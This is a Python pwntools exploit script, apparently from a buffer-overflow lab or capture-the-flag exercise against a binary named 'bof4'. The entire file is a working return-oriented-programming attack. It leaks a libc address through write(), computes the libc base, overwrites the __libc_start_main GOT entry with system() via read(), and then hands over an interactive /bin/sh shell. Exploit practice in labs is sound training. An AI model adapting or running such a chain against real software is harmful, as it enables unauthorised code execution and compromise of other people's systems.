from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True


if local:
    conn = process("./bof4")
else:
    conn = remote(HOST, PORT)

# read
read_plt  = 0x08048320

# write
write_plt = 0x08048350
write_got = 0x0804a018

# __libc_start_main
__libc_start_main_plt = 0x08048340
__libc_start_main_got = 0x0804a014
__libc_start_main_rel = 0x00018180 # Ubuntu 17.10 

# gadget
# 0x08048539: pop esi; pop edi; pop ebp; ret; 
pop3ret = 0x08048539

# system
system_rel = 0x0003a900

gdb.attach(conn)

ROP = "A" * 51

# write(1, __libc_start_main_got, 4)
ROP += p32(write_plt)
ROP += p32(pop3ret)
ROP += p32(1)
ROP += p32(__libc_start_main_got)
ROP += p32(4)

# read(0, __libc_start_main_got, 20)
ROP += p32(read_plt)
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(__libc_start_main_got)
ROP += p32(20)

# system('bin/sh')
ROP += p32(__libc_start_main_plt)
ROP += p32(0xBBBB)
ROP += p32(__libc_start_main_got+4)


print conn.recv(1024)
conn.sendline(ROP)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/sh")
time.sleep(0.1)

conn.interactive()
